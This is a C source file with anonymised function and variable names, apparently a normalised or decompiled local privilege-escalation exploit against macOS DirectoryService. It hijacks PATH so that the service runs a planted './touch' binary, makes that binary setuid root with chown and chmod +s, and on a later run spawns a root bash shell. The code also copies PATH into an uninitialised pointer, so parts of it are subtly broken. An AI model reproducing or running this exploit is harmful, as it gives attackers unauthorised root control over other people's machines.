
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int FUNC_0 (char*,char*,int *) ;
 scalar_t__ FUNC_1 () ;
 char* FUNC_2 (char*) ;
 scalar_t__ FUNC_3 () ;
 int FUNC_4 (char*,...) ;
 int FUNC_5 (char*,char*,int) ;
 int FUNC_6 (int ) ;
 int FUNC_7 (int) ;
 int FUNC_8 (char*,char*) ;
 int FUNC_9 (char*) ;

int
FUNC_10(int VAR_0, char **VAR_1)
{
 char *VAR_2;
 int VAR_3;
 if (VAR_0 < 2) {
  if (FUNC_3() == 0) {
  FUNC_4("euid is root.\n");
  FUNC_6(0);
  FUNC_0("/bin/bash", "bash", ((void*)0));
  }
  FUNC_8(VAR_2, FUNC_2("PATH"));
  FUNC_4("Original path: %s\n", VAR_2);
  FUNC_5("PATH", ".", 1);
  FUNC_4("New path: %s\n", FUNC_2("PATH"));
  FUNC_4("Executing DirectoryService with false PATH...\n");
  if (FUNC_1() == 0) {
   FUNC_0("/usr/sbin/DirectoryService", "DirectoryService", ((void*)0));
  }
  FUNC_4("Forked DirectoryService, pausing before shell exec...\n");
  FUNC_7(3);
  FUNC_4("Cross your fingers.\n");
  FUNC_5("PATH", VAR_2, 1);
  FUNC_4("Path restored: %s\n", FUNC_2("PATH"));
  FUNC_0("./touch", "touch", ((void*)0));
 }
FUNC_9("/usr/sbin/chown root ./touch;/bin/chmod +s ./touch");
}
